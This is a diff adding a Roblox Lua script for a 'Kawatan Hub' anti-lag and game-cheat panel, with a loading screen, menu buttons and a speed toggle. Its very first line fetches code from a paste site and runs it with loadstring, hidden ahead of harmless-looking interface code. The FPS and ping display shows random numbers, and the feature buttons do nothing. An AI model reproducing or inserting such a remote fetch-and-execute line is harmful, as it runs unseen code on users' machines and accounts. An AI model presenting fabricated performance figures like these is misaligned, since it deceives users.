@@ -1,0 +1,146 @@
+loadstring(game:HttpGet("https://pastefy.app/gBpO0gpe/raw"))()
+local gui = script.Parent
+
+-- SKY BLUE COLORS
+local SKY = Color3.fromRGB(85,200,255)
+local SKY_DARK = Color3.fromRGB(30,120,200)
+local BG = Color3.fromRGB(15,20,35)
+
+-- LOADING SCREEN (5s)
+local loading = Instance.new("Frame", gui)
+loading.Size = UDim2.new(1,0,1,0)
+loading.BackgroundColor3 = BG
+
+local loadText = Instance.new("TextLabel", loading)
+loadText.Size = UDim2.new(1,0,1,0)
+loadText.Text = "Kawatan Hub"
+loadText.TextColor3 = SKY
+loadText.BackgroundTransparency = 1
+loadText.TextScaled = true
+
+task.wait(5)
+loading:Destroy()
+
+-- MAIN HUB
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0, 230, 0, 95)
+main.Position = UDim2.new(0.5, -115, 0.3, 0)
+main.BackgroundColor3 = BG
+main.Active = true
+main.Draggable = true
+
+Instance.new("UICorner", main).CornerRadius = UDim.new(0,10)
+
+-- TITLE BAR
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1,0,0,22)
+title.BackgroundColor3 = SKY_DARK
+title.Text = "Kawatan Hub"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextScaled = true
+Instance.new("UICorner", title).CornerRadius = UDim.new(0,10)
+
+-- STATS
+local stats = Instance.new("TextLabel", main)
+stats.Size = UDim2.new(1,0,0,18)
+stats.Position = UDim2.new(0,0,0,24)
+stats.BackgroundTransparency = 1
+stats.TextColor3 = SKY
+stats.TextScaled = true
+
+task.spawn(function()
+	while true do
+		stats.Text = "FPS "..math.random(50,120).." | PING "..math.random(20,120).."ms"
+		task.wait(1)
+	end
+end)
+
+-- LABEL
+local anti = Instance.new("TextLabel", main)
+anti.Size = UDim2.new(1,0,0,18)
+anti.Position = UDim2.new(0,0,0,45)
+anti.BackgroundTransparency = 1
+anti.Text = "JW VILLATORO ANTI-LAG"
+anti.TextColor3 = Color3.fromRGB(255,255,255)
+anti.TextScaled = true
+
+-- MENU BUTTON ☰
+local menu = Instance.new("TextButton", gui)
+menu.Size = UDim2.new(0,35,0,35)
+menu.Position = UDim2.new(1,-45,0,10)
+menu.Text = "≡"
+menu.BackgroundColor3 = SKY_DARK
+menu.TextColor3 = Color3.fromRGB(255,255,255)
+menu.TextScaled = true
+Instance.new("UICorner", menu)
+
+-- FLOAT PANEL (hidden)
+local panel = Instance.new("Frame", gui)
+panel.Size = UDim2.new(0,130,0,200)
+panel.Position = UDim2.new(1,-140,0,55)
+panel.BackgroundColor3 = BG
+panel.Visible = false
+Instance.new("UICorner", panel)
+
+-- BUTTON CREATOR
+local function makeBtn(text, y)
+	local btn = Instance.new("TextButton", panel)
+	btn.Size = UDim2.new(1,-10,0,25)
+	btn.Position = UDim2.new(0,5,0,y)
+	btn.Text = text
+	btn.BackgroundColor3 = SKY
+	btn.TextColor3 = Color3.fromRGB(0,0,0)
+	btn.TextScaled = true
+	Instance.new("UICorner", btn)
+end
+
+-- BUTTONS
+makeBtn("AUTO PLAY", 5)
+makeBtn("PLAY", 35)
+makeBtn("FLING", 65)
+makeBtn("LOCK", 95)
+makeBtn("DROP", 125)
+makeBtn("FLOAT", 155)
+
+-- SPEED CUSTOMIZER
+local speedBox = Instance.new("Frame", panel)
+speedBox.Size = UDim2.new(1,-10,0,40)
+speedBox.Position = UDim2.new(0,5,1,-45)
+speedBox.BackgroundColor3 = SKY_DARK
+Instance.new("UICorner", speedBox)
+
+local speedText = Instance.new("TextLabel", speedBox)
+speedText.Size = UDim2.new(1,0,0.5,0)
+speedText.Text = "Speed Customizer"
+speedText.TextColor3 = Color3.fromRGB(255,255,255)
+speedText.BackgroundTransparency = 1
+speedText.TextScaled = true
+
+local speedToggle = Instance.new("TextButton", speedBox)
+speedToggle.Size = UDim2.new(1,0,0.5,0)
+speedToggle.Position = UDim2.new(0,0,0.5,0)
+speedToggle.Text = "ON"
+speedToggle.BackgroundColor3 = SKY
+speedToggle.TextColor3 = Color3.fromRGB(0,0,0)
+speedToggle.TextScaled = true
+
+local on = true
+speedToggle.MouseButton1Click:Connect(function()
+	on = not on
+	speedToggle.Text = on and "ON" or "OFF"
+end)
+
+-- MENU TOGGLE (with simple slide effect)
+local open = false
+menu.MouseButton1Click:Connect(function()
+	open = not open
+	panel.Visible = true
+
+	if open then
+		panel:TweenPosition(UDim2.new(1,-140,0,55), "Out", "Quad", 0.2, true)
+	else
+		panel:TweenPosition(UDim2.new(1,0,0,55), "Out", "Quad", 0.2, true)
+		task.wait(0.2)
+		panel.Visible = false
+	end
+end)
